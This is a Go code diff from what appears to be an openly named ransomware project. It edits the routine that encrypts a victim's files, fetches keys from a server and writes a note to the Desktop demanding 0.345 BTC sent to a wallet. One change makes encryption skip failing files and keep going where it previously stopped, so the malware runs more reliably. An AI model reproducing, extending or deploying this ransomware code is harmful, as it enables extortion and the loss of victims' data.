@@ -12,28 +12,6 @@ import (
 	"github.com/mauri870/ransomware/utils"
 )
 
-var (
-	EncMessage = `
-	YOUR FILES HAVE BEEN ENCRYPTED USING A STRONG 
-	AES-256 ALGORITHM.
-
-	YOUR IDENTIFICATION IS %s
-
-	PLEASE SEND %s TO THE FOLLOWING WALLET 
-
-			      %s
-
-	TO RECOVER THE KEY NECESSARY TO DECRYPT YOUR
-	FILES
-
-	# The enc key is inserted for testing
-	# ENCRYPTION KEY: %s
-
-	AFTER RECOVER YOUR KEY, RUN THE FOLLOWING:
-	%s decrypt yourkeyhere
-	`
-)
-
 func encryptFiles() {
 	res, err := client.CallServer("api/generatekeypair")
 	if err != nil {
@@ -69,7 +47,8 @@ func encryptFiles() {
 
 		ciphertext, err := crypto.Encrypt([]byte(keys["enckey"]), text)
 		if err != nil {
-			log.Fatal(err)
+			log.Println(err)
+			continue
 		}
 
 		ioutil.WriteFile(path+EncryptionExtension, ciphertext, 0600)
@@ -78,9 +57,28 @@ func encryptFiles() {
 	}
 
 	if len(MatchedFiles) > 0 {
-		message := []byte(fmt.Sprintf(EncMessage, keys["id"], "0.345 BTC", "XWpXtxrJpSsRx5dICGjUOwkrhIypJKVr", keys["enckey"], os.Args[0]))
+		message := `
+		YOUR FILES HAVE BEEN ENCRYPTED USING A STRONG 
+		AES-256 ALGORITHM.
 
-		ioutil.WriteFile(BaseDir+"Desktop\\READ_TO_DECRYPT.txt", message, 0600)
+		YOUR IDENTIFICATION IS %s
+
+		PLEASE SEND %s TO THE FOLLOWING WALLET 
+
+				      %s
+
+		TO RECOVER THE KEY NECESSARY TO DECRYPT YOUR
+		FILES
+
+		# The enc key is inserted for testing
+		# ENCRYPTION KEY: %s
+
+		AFTER RECOVER YOUR KEY, RUN THE FOLLOWING:
+		%s decrypt yourkeyhere
+		`
+		content := []byte(fmt.Sprintf(message, keys["id"], "0.345 BTC", "XWpXtxrJpSsRx5dICGjUOwkrhIypJKVr", keys["enckey"], os.Args[0]))
+
+		ioutil.WriteFile(BaseDir+"Desktop\\READ_TO_DECRYPT.txt", content, 0600)
 
 		log.Println("Done! Don't forget to read the READ_FOR_DECRYPT.txt file on Desktop")
 	}
